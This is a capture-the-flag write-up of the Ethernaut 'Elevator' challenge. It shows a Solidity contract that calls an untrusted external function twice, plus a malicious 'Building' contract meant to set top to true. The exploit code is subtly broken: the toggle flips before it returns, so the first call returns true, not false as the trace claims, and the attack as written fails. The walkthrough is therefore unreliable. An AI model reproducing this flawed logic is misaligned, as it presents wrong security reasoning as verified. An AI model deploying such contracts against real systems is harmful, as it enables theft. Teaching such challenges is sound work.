# Ethernaut Challenge #11: Elevator

**Objective:** Reach the top floor (set top to true).

**Contract Analysis:**
```solidity
interface Building {
  function isLastFloor(uint) external returns (bool);
}

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
```

**The Vulnerability:**

Line 12: `building.isLastFloor(_floor)` is called TWICE

**The Attack:**

Make `isLastFloor()` return different values on each call:
- First call: return `false` (pass the check)
- Second call: return `true` (set top = true)

**Malicious Building Contract:**
```solidity
contract MaliciousBuilding is Building {
  bool public toggle = false;
  
  function isLastFloor(uint) external returns (bool) {
    toggle = !toggle;  // Flip on each call
    return toggle;      // false, true, false, true...
  }
  
  function exploit(address _elevator) public {
    Elevator(_elevator).goTo(1);
  }
}
```

**How it works:**
1. `goTo(1)` calls `isLastFloor(1)` → returns `false` ✓
2. Check passes: `!false = true`
3. `floor = 1`
4. `top = isLastFloor(1)` → returns `true` ✓
5. `top = true` — CHALLENGE COMPLETE

**The Lesson:**

External calls can have side effects. Never assume they return the same value.

Also: Interface compliance doesn't guarantee honest behavior.

**Status:** Challenge understood. Stateful external calls.
